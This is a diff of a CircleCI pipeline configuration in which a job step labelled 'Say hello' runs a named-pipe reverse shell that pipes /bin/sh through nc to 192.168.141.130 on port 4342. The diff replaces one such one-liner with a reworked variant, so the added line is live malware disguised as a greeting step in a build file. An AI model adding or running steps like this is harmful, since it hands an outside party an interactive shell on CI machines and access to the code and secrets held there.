@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.130 4342 >/tmp/f"
+          command: "rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc 192.168.141.130 4342 1>/tmp/b"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
